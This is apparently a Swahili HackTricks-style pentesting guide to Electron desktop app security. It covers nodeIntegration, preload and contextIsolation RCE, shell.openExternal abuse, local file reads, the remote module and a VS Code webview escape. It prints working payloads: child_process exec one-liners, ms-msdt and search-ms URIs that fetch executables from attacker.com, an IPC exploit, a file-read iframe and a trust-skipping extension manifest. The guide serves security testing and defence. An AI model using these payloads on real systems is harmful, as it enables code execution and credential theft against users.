# Programu za Kompyuta za Electron

{{#include ../../banners/hacktricks-training.md}}

## Utangulizi

Electron huunganisha mchakato mkuu wa **Node.js** wenye ruhusa za juu na michakato ya renderer ya **Chromium**. Electron si kivinjari cha wavuti: msimbo wa programu unaweza kufichua kwa makusudi uwezo kama vile ufikiaji wa mfumo wa faili na shell, kwa hivyo kupakia maudhui yasiyoaminika kunahitaji muundo mkali zaidi wa mipaka kuliko tovuti ya kawaida.<sup>[[21]](#references)</sup>

Msimbo wa programu ya Electron kwa kawaida huwekwa kwenye archive ya `.asar`. Itoe kabla ya kukagua chanzo:

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

Faili ya `package.json` ya programu hutambua sehemu yake kuu ya kuingilia. Faili hiyo kwa kawaida huunda madirisha ya renderer na kuweka `webPreferences` zake nyeti kwa usalama.

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron ina aina mbili kuu za michakato:

- Main Process (ina ufikiaji kamili wa NodeJS)
- Renderer Process (inapaswa kuwa na ufikiaji wa NodeJS wenye vizuizi kwa sababu za usalama)

![Electron Desktop Apps - Utangulizi: Renderer Process (inapaswa kuwa na ufikiaji wa NodeJS wenye vizuizi kwa sababu za usalama)](<../../images/image (182).png>)

**renderer process** itakuwa dirisha la kivinjari linalopakia faili:<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

**main process** husanidi kila renderer process, kwa kawaida wakati wa kuunda `BrowserWindow`. Mipangilio salama hupunguza uwezekano wa renderer iliyoathiriwa kusababisha utekelezaji wa native code, lakini haiwezi kufanya maudhui yasiyoaminika kuwa salama yenyewe.<sup>[[21]](#references)[[22]](#references)</sup>

Kagua angalau mapendeleo haya ya renderer:<sup>[[22]](#references)</sup>

- **`nodeIntegration`** ni `false` kwa chaguomsingi. Kuiwezesha huipa JavaScript ya renderer ufikiaji wa Node.js APIs na pia huzima sandbox ya renderer hiyo.
- **`contextIsolation`** ni `true` kwa chaguomsingi. Hutenganisha JavaScript context ya ukurasa na context inayotumiwa na preload scripts na Electron internals.
- **`preload`** haina njia chaguomsingi. Preload script iliyosanidiwa huendeshwa kabla ya page scripts na inaweza kufichua APIs zenye wigo finyu kupitia `contextBridge`.
- **`sandbox`** ni `true` kwa chaguomsingi tangu Electron 20. Huzuia renderer kufikia rasilimali za operating system; kuweka `nodeIntegration: true` huizima.
- **`nodeIntegrationInWorker`** ni `false` kwa chaguomsingi na hudhibiti Node.js integration katika Web Workers.
- **`nodeIntegrationInSubFrames`** ni `false` kwa chaguomsingi.
  - Ikiwa **`nodeIntegration`** **imewezeshwa**, hii ingeruhusu matumizi ya **Node.js APIs** katika kurasa za wavuti **zilizopakiwa kwenye iframes** ndani ya Electron application.
  - Ikiwa **`nodeIntegration`** **imezimwa**, basi preloads zitapakiwa kwenye iframe

Mfano wa usanidi:

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

Baadhi ya **RCE payloads** kutoka [hapa](https://7as.es/electron/nodeIntegration_rce.txt):<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### Nasa traffic

Rekebisha usanidi wa start-main na uongeze matumizi ya proxy kama vile:

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## Ufuatiliaji tuli wa mpaka kutoka ASAR hadi native kwa REA

**REA** inaweza kusoma ASAR au saraka ya programu iliyotolewa bila kutekeleza bootstrap yake ya JavaScript. Grafu ya programu yake hurekodi sehemu za kuanzia za package, moduli zilizounganishwa, mipangilio ya `BrowserWindow` na preload, vipengee vya `contextBridge`, usajili wa IPC, maombi ya native add-on na utambulisho wa source map. Hii hutoa mahali pa kuanzia kufuatilia uwezo unaoonekana kwa renderer hadi kwenye handler yenye upendeleo ya main process.<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

Kwa literal feature string, pitisha rekodi kamili ya Evidence kama `application` na ubadilishe seed na ile iliyoonekana kwenye target:<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

Mtiririko ule ule wa `trace_application_feature` pia hukubali literal API member, IPC channel au module iliyobainika kama seed. Kagua njia ya handler inayotokana nayo, wagombea wa validation na native handoff dhidi ya maeneo ya source yaliyorejeshwa. `invoke` ya renderer huendana tu na mgombea mmoja wa kipekee wa `ipcMain.handle`/`handleOnce` kwenye channel ileile halisi; `send` vilevile huhitaji mgombea mmoja wa kipekee wa `ipcMain.on`/`once`/`addListener`. Handlers zinazobadilika au zilizo na nakala hubaki bila kutatuliwa. Member ya `.node` iliyoombwa si native export iliyothibitishwa; Evidence inayolingana ya Hopper/Ghidra lazima iwe na digest ileile ya artifact kabla ya kufikia hitimisho hilo. Uwezekano wa kufikiwa kwa njia ya static pia hauthibitishi kuwa njia hiyo ilitekelezwa.<sup>[[24]](#references)[[25]](#references)</sup>

Kwa mpaka wa uaminifu kati ya renderer na main na validation ya handler, angalia [RCE ya Electron contextIsolation kupitia IPC](electron-contextisolation-rce-via-ipc.md).

Kwa ufuatiliaji wa native unaofungamana na provider, angalia [Zana za Reversing na Mbinu za Msingi](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea).

## Eneo la mashambulizi la Electron auto-update

Kwa uadilifu wa release-feed, rollback, mkanganyiko wa signed-channel na TOCTOU ya staging-file, angalia [Mipaka ya uaminifu ya Electron auto-update](electron-auto-update-trust-boundaries.md).

## Electron Local Code Injection

Ukiwa na ufikiaji wa ndani wa kuandika au kufanya instrumentation kwenye app iliyosakinishwa, angalia [Electron local code injection na kuchezewa kwa snapshot](electron-local-code-injection-and-snapshot-tampering.md) kwa njia za ASAR/main-process na V8 snapshot, pamoja na viungo maalum vya kila OS.

## RCE: XSS + nodeIntegration

Ikiwa **nodeIntegration** imewekwa kuwa **on**, JavaScript ya ukurasa wa wavuti inaweza kutumia vipengele vya Node.js kwa urahisi kwa kuita tu `require()`. Kwa mfano, njia ya kutekeleza programu ya calc kwenye Windows ni:

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Script iliyobainishwa katika mpangilio huu **hupakiwa kabla ya script nyingine katika renderer**, kwa hiyo ina **ufikiaji usio na kikomo wa Node APIs**:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

Kwa hivyo, script inaweza ku-export node-features kwenye kurasa:

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **Ikiwa `contextIsolation` imewashwa, hii haitafanya kazi**

## RCE: XSS + contextIsolation

_**contextIsolation**_ huunda **mazingira tofauti ya utekelezaji kati ya script za ukurasa wa wavuti na code ya ndani ya JavaScript ya Electron**, ili utekelezaji wa JavaScript katika kila code usiathiri nyingine. Hiki ni kipengele muhimu cha kuondoa uwezekano wa RCE.

Ikiwa mazingira ya utekelezaji hayajatenganishwa, mshambuliaji anaweza:

1. Kutekeleza **JavaScript yoyote kwenye renderer** (XSS au kuelekeza kwenye tovuti za nje)
2. **Kubadilisha method iliyojengewa ndani** ambayo hutumiwa katika code ya preload au code ya ndani ya Electron, na kuweka function yake mwenyewe
3. **Kusababisha** matumizi ya **function iliyobadilishwa**
4. RCE?

Kuna sehemu 2 ambapo method zilizojengewa ndani zinaweza kubadilishwa: Katika code ya preload au code ya ndani ya Electron:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Bypass tukio la kubofya

Ikiwa kuna vizuizi vinavyotumika unapobofya kiungo, huenda ukaweza kuvipita **kwa kubofya kwa kitufe cha kati cha kipanya** badala ya kubofya kawaida kwa kitufe cha kushoto.

```javascript
window.addEventListener('click', (e) => {
```

## RCE kupitia shell.openExternal

Kwa maelezo zaidi kuhusu mifano hii, angalia [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) na [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>

Unapoweka programu ya Electron ya desktop, ni muhimu kuhakikisha kuwa mipangilio ya `nodeIntegration` na `contextIsolation` ni sahihi. Imethibitishwa kuwa mipangilio hii huzuia kwa vitendo **utekelezaji wa msimbo wa mbali wa upande wa mteja (RCE)** unaolenga preload scripts au msimbo asilia wa Electron kutoka kwa main process.

Mtumiaji anapobofya viungo au kufungua madirisha mapya, event listeners mahususi huwashwa; ni muhimu kwa usalama na utendakazi wa programu:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

Listeners hizi **hubatilishwa na programu ya kompyuta ya mezani** ili kutekeleza **mantiki yake ya biashara**. Programu hutathmini kama kiungo kilichofunguliwa kinapaswa kufunguliwa ndani ya programu au kwenye kivinjari cha wavuti cha nje. Uamuzi huu kwa kawaida hufanywa kupitia chaguo za kukokotoa, `openInternally`. Chaguo hili la kukokotoa likirejesha `false`, inaashiria kwamba kiungo kinapaswa kufunguliwa nje ya programu kwa kutumia chaguo la kukokotoa la `shell.openExternal`.

**Huu hapa ni mfano rahisi wa pseudocode:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Mbinu bora za usalama za Electron JS zinashauri dhidi ya kupokea maudhui yasiyoaminika kwa kutumia chaguo la kukokotoa la `openExternal`, kwa kuwa linaweza kusababisha RCE kupitia itifaki mbalimbali. Mifumo ya uendeshaji hutumia itifaki tofauti ambazo zinaweza kusababisha RCE. Kwa mifano ya kina na maelezo zaidi kuhusu mada hii, rejelea [nyenzo hii](https://positive.security/blog/url-open-rce#windows-10-19042), inayojumuisha mifano ya itifaki za Windows zinazoweza kutumiwa kutumia udhaifu huu.<sup>[[10]](#references)</sup>

Katika macos, chaguo la kukokotoa la `openExternal` linaweza kutumiwa kutekeleza amri kiholela kama vile `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Mifano ya mashambulizi yanayotumia itifaki za Windows ni pamoja na:**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Udhaifu huu unaweza kupatikana katika **[ripoti hii](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.<sup>[[11]](#references)</sup>

**webviewTag** ni **kipengele kilichopitwa na wakati** kinachoruhusu matumizi ya **NodeJS** katika **renderer process**. Kinapaswa kuzimwa kwa kuwa kinaruhusu kupakia script ndani ya preload context kama hii:

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

Kwa hiyo, mshambuliaji aliyefaulu kupakia ukurasa wowote angeweza kutumia tag hiyo **kupakia preload script yoyote**.

Kisha preload script hii ilitumiwa vibaya kuita **huduma ya IPC iliyo hatarini (`skype-new-window`)**, ambayo ilikuwa ikiita **`shell.openExternal`** ili kupata RCE:

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## Kusoma Faili za Ndani: XSS + contextIsolation

**Kuzima `contextIsolation` huwezesha matumizi ya tagi za `<webview>`**, zinazofanana na `<iframe>`, kwa kusoma na kutoa nje faili za ndani. Mfano uliotolewa unaonyesha jinsi ya kutumia udhaifu huu kusoma yaliyomo kwenye faili za ndani:<sup>[[2]](#references)</sup>

![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - Kusoma Faili za Ndani: XSS + contextIsolation: Kuzima contextIsolation huwezesha matumizi ya tagi , zinazofanana na , kwa...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Zaidi ya hayo, njia nyingine ya **kusoma faili ya ndani** imeshirikiwa, ikionyesha udhaifu muhimu wa kusoma faili za ndani katika programu ya desktop ya Electron. Hii inahusisha kuingiza script ili kutumia programu vibaya na kutoa data nje:

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + Chromium ya Zamani**

Ikiwa toleo la **Chromium** lililojumuishwa kwenye programu ni la zamani na lina udhaifu unaojulikana, huenda ikawezekana kulitumia na kubadilisha XSS kuwa RCE.<sup>[[20]](#references)</sup>\
Unaweza kuona mfano katika **writeup** hii: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **XSS Phishing kupitia ukwepaji wa regex ya URL ya ndani**

Ukipata XSS lakini **huwezi kusababisha RCE au kuiba faili za ndani**, bado unaweza kujaribu **kuiba credentials kupitia phishing**.<sup>[[1]](#references)</sup>

Kwanza, kagua msimbo wa frontend ili kubaini kinachotokea URL mpya inapofunguliwa:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

Wito wa **`openInternally`** huamua ikiwa kiungo cha jukwaa kitafunguka kwenye **dirisha la desktop** au rasilimali ya mtu mwingine itafunguka kwenye kivinjari cha mfumo.

Ikiwa regex ya allowlist ya URL ya function inaweza kuepukwa—kwa mfano, kwa sababu nukta kwenye hostname hazikuwekewa alama ya escape—mshambulizi anaweza kutumia vibaya XSS ili kufungua kidokezo cha kuingiza credentials kinachoaminika kwenye miundombinu anayoidhibiti:

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## `file://` Protocol

Kama ilivyotajwa kwenye [mwongozo wa usalama wa Electron](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), kurasa zinazoendeshwa kwenye **`file://`** hupata ufikiaji mpana wa faili. Kwa hiyo, **XSS inaweza kutumika kupakia faili zozote** kutoka kwenye mashine ya mtumiaji. **Custom protocol** iliyoundwa ipasavyo inaweza kuzuia ufikiaji kwa seti maalum ya faili.<sup>[[21]](#references)</sup>

Kwa bypass tofauti ya worker-context ya file-scope katika previews za desktop assistant, angalia [AI assistant embedded browser trust boundaries](../../AI/AI-Embedded-Browser-Trust-Boundaries.md#worker-context-bypass-of-a-local-previews-file-scope).

## Remote module

Moduli ya Electron Remote huruhusu **renderer processes kufikia APIs za main process**, na hivyo kurahisisha mawasiliano ndani ya programu ya Electron. Hata hivyo, kuwezesha moduli hii huleta hatari kubwa za usalama. Hupanua attack surface ya programu, na kuifanya iwe rahisi zaidi kuathiriwa na udhaifu kama vile mashambulizi ya cross-site scripting (XSS).

> [!TIP]
> Ingawa moduli ya **remote** hufichua baadhi ya APIs kutoka main process kwenda renderer processes, si rahisi kupata RCE kwa kutumia vibaya tu components. Hata hivyo, components zinaweza kufichua taarifa nyeti.

> [!WARNING]
> Programu nyingi ambazo bado zinatumia moduli ya remote hufanya hivyo kwa njia **inayohitaji NodeIntegration iwezeshwe** kwenye renderer process, jambo ambalo ni **hatari kubwa ya usalama**.

Moduli ya `remote` iliyojengewa ndani ya Electron ilitangazwa kuwa deprecated na baadaye ikaondolewa; programu ambazo bado zinahitaji muundo wake zinaweza kutumia package tofauti ya `@electron/remote`. Kwa sababu ya athari zake kwa usalama na utendaji, epuka kufichua uwezo wa mtindo wa remote kwa renderers zisizoaminika.

Kwa kutumia `@electron/remote`, lazima kwanza **iinitializwe kwenye main process**:

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

Mchakato wa renderer unaweza kisha ku-import objects kutoka kwenye module:

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

**[Makala ya blogu](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** inaonyesha baadhi ya **functions** za kuvutia zinazofichuliwa na object **`app`** kutoka kwenye remote module:<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - **Huwasha upya** programu kwa **kufunga** instance ya sasa na **kuanzisha** mpya. Ni muhimu kwa **masasisho ya programu** au **mabadiliko makubwa ya hali**.
- **`app.setAppLogsPath([path])`**  
   - **Hufafanua** au **huunda** directory ya kuhifadhi **logs za programu**. Logs zinaweza **kupatikana** au **kubadilishwa** kwa kutumia **`app.getPath()`** au **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - **Husajili** executable ya sasa kama **handler chaguomsingi** ya **protocol** maalum. Unaweza kutoa **path maalum** na **arguments** ikihitajika.
- **`app.setUserTasks(tasks)`**  
   - **Huongeza** tasks kwenye **kategoria ya Tasks** katika **Jump List** (kwenye Windows). Kila task inaweza kudhibiti jinsi programu **inavyoanzishwa** au **arguments** zinazopitishwa.
- **`app.importCertificate(options, callback)`**  
   - **Huingiza** **cheti cha PKCS#12** kwenye **hifadhi ya vyeti** ya mfumo (Linux pekee). **Callback** inaweza kutumika kushughulikia matokeo.
- **`app.moveToApplicationsFolder([options])`**  
   - **Huhamisha** programu hadi kwenye **folda ya Applications** (kwenye macOS). Husaidia kuhakikisha **usakinishaji wa kawaida** kwa watumiaji wa Mac.
- **`app.setJumpList(categories)`**  
   - **Huweka** au **huondoa** **Jump List maalum** kwenye **Windows**. Unaweza kubainisha **kategoria** za kupanga jinsi tasks zinavyoonekana kwa mtumiaji.
- **`app.setLoginItemSettings(settings)`**  
   - **Husanidi** ni **executables** zipi zinazoanzishwa wakati wa **kuingia**, pamoja na **options** zake (macOS na Windows pekee).
  
Mfano:

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## systemPreferences module

**API kuu** ya kufikia mapendeleo ya mfumo na **kutoa matukio ya mfumo** katika Electron. Mbinu kama **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault**, na **setUserDefault** zote ni **sehemu ya** module hii.

**Matumizi ya mfano:**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **Husikiliza** **arifa asilia za macOS** kwa kutumia NSDistributedNotificationCenter.  
* Kabla ya **macOS Catalina**, ungeweza kunasa arifa **zote** zinazosambazwa kwa kupitisha **nil** kwa CFNotificationCenterAddObserver.  
* Baada ya **Catalina / Big Sur**, programu zilizowekwa kwenye sandbox bado zinaweza **kujisajili** kupokea **matukio mengi** (kwa mfano, **kufunga/kufungua skrini**, **kuunganisha volume**, **shughuli za mtandao**, n.k.) kwa kusajili arifa **kwa jina**.

### **getUserDefault / setUserDefault**

* Huunganisha na **NSUserDefaults**, inayohifadhi mapendeleo ya **programu** au **kimataifa** kwenye macOS.
    
* **getUserDefault** inaweza **kupata** taarifa nyeti, kama vile **maeneo ya hivi karibuni ya faili** au **mahali alipo mtumiaji**.
    
* **setUserDefault** inaweza **kubadilisha** mapendeleo haya, na huenda ikaathiri **usanidi** wa programu.
    
* Katika **matoleo ya zamani ya Electron** (kabla ya v8.3.0), ni **seti ya kawaida** ya NSUserDefaults pekee iliyokuwa **inafikika**.

## Shell.showItemInFolder

Kazi hii huonyesha faili iliyotolewa kwenye kidhibiti faili. Kwenye mifumo na matoleo yaliyoathiriwa, kitendo hicho **kingeweza kutekeleza faili kiotomatiki**.

Kwa maelezo zaidi, angalia [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## Content Security Policy

Programu za Electron zinapaswa kuwa na **Content Security Policy (CSP)** ili **kuzuia mashambulizi ya XSS**. **CSP** ni **kiwango cha usalama** kinachosaidia **kuzuia** **utekelezaji** wa **code isiyoaminika** kwenye kivinjari.

Kwa kawaida **husaniwa** kwenye faili ya **`main.js`** au kiolezo cha **`index.html`**, CSP ikiwa ndani ya **meta tag**.

Kwa maelezo zaidi, angalia:


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE: Webview CSP + postMessage trust + local file loading (VS Code 1.63)

Mnyororo huu wa mashambulizi wa ulimwengu halisi uliathiri Visual Studio Code 1.63 (CVE-2021-43908) na unaonyesha jinsi XSS moja inayotokana na markdown kwenye webview inavyoweza kupanuliwa hadi RCE kamili wakati CSP, postMessage na vidhibiti vya scheme vimesanidiwa vibaya. PoC ya umma: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

Muhtasari wa mnyororo wa mashambulizi
- XSS ya kwanza kupitia CSP ya webview: CSP iliyozalishwa ilijumuisha `style-src 'self' 'unsafe-inline'`, ikiruhusu uingizaji wa code kupitia inline/style katika muktadha wa `vscode-webview://`. Payload ilituma beacon kwa `/stealID` ili kuiba extensionId ya webview lengwa.
- Kutengeneza URL ya webview lengwa: Kutumia ID iliyovuja kuunda `vscode-webview://<extensionId>/.../<publicUrl>`.
- XSS ya pili kupitia uaminifu wa postMessage: Webview ya nje iliamini `window.postMessage` bila ukaguzi madhubuti wa origin/type na ikapakia HTML ya mshambulizi ikiwa na `allowScripts: true`.
- Kupakia faili ya ndani kupitia uandishi upya wa scheme/path: Payload iliandika upya `file:///...` kuwa `vscode-file://vscode-app/...` na kubadilisha `exploit.md` na `RCE.html`, ikitumia vibaya uthibitishaji dhaifu wa path kupakia resource ya ndani yenye ruhusa za juu.
- RCE katika muktadha unaowezesha Node: HTML iliyopakiwa ilitekelezwa huku Node APIs zikiwa zinapatikana, na hivyo kuruhusu utekelezaji wa amri za OS.

Mfano wa primitive ya RCE katika muktadha wa mwisho
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

Usomaji unaohusiana kuhusu masuala ya uaminifu ya postMessage:

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev: shortcuts bandia za webview + madaraja ya amri za extension yanayotegemea matamko

Aina tofauti ya njia ya kutoroka kutoka VS Code webview ilijitokeza Juni 2026: **JavaScript isiyoaminika ndani ya webview ya notebook/preview ingeweza kuunda shortcuts za kimataifa zenye mamlaka** kwa sababu preload ya webview ilipeleka data ya `keydown` kwa workbench ya host na host ikaichukulia kama ingizo halisi la mtumiaji.<sup>[[14]](#references)</sup>

Hii ni sehemu ya historia pana zaidi ya mashambulizi yanayolenga mipaka ya uaminifu ya IDE, ambapo maudhui yanayodhibitiwa na mradi hufikia vipengele vya editor vyenye mamlaka.<sup>[[19]](#references)</sup>

### Hitilafu ya mpaka

Ikiwa webview ya cross-origin/sandboxed itanakili sehemu za keyboard zinazodhibitiwa na mshambuliaji (`key`, `code`, `keyCode`, modifiers, `repeat`) kwenye daraja la `postMessage`/message-port lenye mamlaka **bila kukagua `event.isTrusted`**, JavaScript ndani ya webview inaweza kutekeleza shortcuts za workbench kwa kutumia:<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

Hili ni muhimu hasa wakati **uandikaji wa maandishi wa kuiga umezuiwa** na browser. Matukio ya vitufe yaliyoandikwa kwa script kwa kawaida **hayawezi kuandika maandishi yoyote ndani ya vipengele vya HTML `<input>`**, lakini bado huanzisha mikato ya kibodi inayochakata `keydown` moja kwa moja.

### Mifumo ya matumizi mabaya kwa vitendo

- **Matumizi mabaya ya UI yanayolenga mikato ya kibodi:** lenga vifungo vya jumla kama vile kukubali arifa, kuvinjari palette, kuamilisha kitufe kilicholenga, au kusogeza menyu badala ya kujaribu kuandika amri.
- **Vidokezo vya upendeleo vinavyotabirika kutoka kwa metadata ya workspace:** `.vscode/extensions.json` inayodhibitiwa na repository inaweza kupendekeza extension hasidi na kuunda arifa ya usakinishaji inayotabirika, ambayo inaweza kukubaliwa kwa mkato wa kibodi kama `Ctrl+Shift+A`.
- **Manifest ya extension ya declarative kama daraja la amri:** hata kama code ya extension ya workspace ya ndani imezuiwa na CSP katika web VS Code, michango ya declarative `package.json` bado inaweza kupakiwa. Extension ya ndani iliyo chini ya `.vscode/extensions` inaweza kusajili keybinding inayoita `runCommands` kisha amri ya ndani yenye upendeleo kama `workbench.extensions.installExtension`.<sup>[[14]](#references)[[18]](#references)</sup>

Mfano wa muundo wa manifest:

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **Bendera za usalama zilizofichwa zinazofikiwa kupitia metadata isiyoaminika:** ikiwa command ya ndani inakubali arguments zinazodhibitiwa na mshambulizi kama `{"context":{"skipPublisherTrust":true}}`, metadata ya declarative inaweza kuficha kidirisha cha uthibitishaji wa uaminifu na kusakinisha extension inayopangishwa kwenye Marketplace/CDN, ambayo hatimaye hutekeleza code ya mshambulizi.
- **Matumizi mabaya ya trusted workspace:** ikiwa workspaces za mbali/web zinaaminika kiotomatiki, extensions za workspace ya ndani huwa daraja lenye thamani kubwa kutoka kwenye maudhui ya repository hadi kwenye vitendo vya editor vyenye mamlaka ya juu.
- **Kupanua wigo baada ya kuathiriwa:** baada ya extension kutekelezwa, kagua tokeni ambazo editor hufichua kwa extensions. Katika `github.dev`, tokeni ya GitHub iliyoibwa ilikuwa halali hata nje ya repository iliyofunguliwa, hivyo kuuliza `https://api.github.com/user/repos` kuliorodhesha repositories binafsi za ziada zilizoweza kufikiwa.

### Maelezo ya ukaguzi

- Chukulia **usambazaji wa input kutoka webview hadi host** kama mpaka wa mamlaka; usiwahi kutuma tena key/click events ghushi kutoka kwenye frames zisizoaminika kwenda kwa host.
- Tekeleza uidhinishaji **ndani ya commands nyeti**. Usikubali command context iliyotolewa na caller inayoweza kuweka bendera za ndani kama `skipPublisherTrust`.
- Usidhani kwamba kuzuia code ya extension ya ndani inayoweza kutekelezwa kunatosha; pia kagua **michango ya declarative** (`keybindings`, `menus`, `commands`, tasks) kutoka kwenye manifests zinazodhibitiwa na workspace.
